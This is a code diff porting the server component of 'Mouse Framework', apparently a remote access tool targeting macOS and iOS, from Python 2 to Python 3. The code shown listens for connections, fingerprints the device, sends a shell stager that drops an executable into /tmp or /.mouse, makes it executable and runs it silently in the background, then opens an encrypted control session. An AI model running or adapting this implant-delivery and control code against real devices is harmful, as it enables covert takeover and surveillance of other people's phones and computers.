@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -19,10 +19,10 @@
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 import socket, ssl, os, json, sys
-import helper as h
-import session
+import core.helper as h
+import core.session as session
 import binascii
-from multihandler import MultiHandler
+from core.multihandler import MultiHandler
 import time
 
 downloads_dir = "../downloads"
@@ -72,11 +72,11 @@ class Server:
         try:
             lhost = h.getip()
             lport = None
-            choice = raw_input(h.info_general_raw("Local host: ")).strip(" ")
+            choice = input(h.info_general_raw("Local host: ")).strip(" ")
             if choice != "":
                 lhost = choice
             while True:
-                lport = raw_input(h.info_general_raw("Local port: ")).strip(" ")
+                lport = input(h.info_general_raw("Local port: ")).strip(" ")
                 if not lport:
                     lport = 4444
                 try:
@@ -114,7 +114,7 @@ class Server:
     def start_multi_handler(self):
         self.multihandler.start_background_server()
         self.multihandler.interact()
-        print ""
+        print("")
 
 
     def craft_payload(self,device_arch):
@@ -136,7 +136,7 @@ class Server:
             instructions = \
             "cat >/private/tmp/mouse;"+\
             "chmod 777 /private/tmp/mouse;"+\
-            "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/private/tmp/mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing macOS payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
@@ -149,7 +149,7 @@ class Server:
             "cat >/tmp/mouse;"+\
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
-            "/.mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing iOS payload...") 
             return (instructions,payload)
         else:
@@ -175,19 +175,19 @@ class Server:
         # identify device
         hostAddress = addr[0]
         self.verbose_print("Connecting to "+hostAddress+"...")
-        conn.send(identification_shell_command)
-        device_arch = conn.recv(128).strip()
+        conn.send(identification_shell_command.encode())
+        device_arch = conn.recv(128).decode().strip()
         if not device_arch:
             return
 
         # send bash stager
-        try:
-            bash_stager, executable = self.craft_payload(device_arch)
-        except Exception as e:
-            raw_input("Press enter to continue...").strip(" ")
-            return
+        #try:
+        bash_stager, executable = self.craft_payload(device_arch)
+        #except Exception as e:
+        #    input("Press enter to continue...").strip(" ")
+        #    return
         self.debug_print(bash_stager.strip())
-        conn.send(bash_stager)
+        conn.send(bash_stager.encode())
 
         # send executable
         conn.send(executable)
@@ -213,7 +213,7 @@ class Server:
                                  certfile=".keys/server.crt",
                                  keyfile=".keys/server.key",
                                  ssl_version=ssl.PROTOCOL_SSLv23)
-        raw = ssl_sock.recv(256)
+        raw = ssl_sock.recv(256).decode()
         device_info = json.loads(raw)
         return session.Session(self,ssl_sock,device_info)
         
